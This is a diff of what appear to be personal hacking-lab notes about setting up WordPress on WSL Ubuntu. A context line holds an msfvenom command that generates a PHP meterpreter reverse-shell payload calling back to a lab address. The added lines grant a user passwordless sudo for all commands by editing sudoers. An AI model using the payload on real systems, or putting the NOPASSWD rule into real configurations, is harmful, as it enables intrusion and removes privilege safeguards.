@@ -110,6 +110,11 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.174.128 lport=443 -f raw >
 
 
 ////Now Wordpress set up in wsl ubuntu:
+sudo visudo
+now use # to comment #@includedir /etc/sudoers.d
+and write this line
+sajib  (use tab here ) ALL=(ALL:ALL) NOPASSWD:ALL
+
 sudo apt update && sudo apt upgrade -y
 sudo apt install net-tools mc php -y
 sudo apt install apache2 mariadb-server php php-zip php-mysql php-xml -y
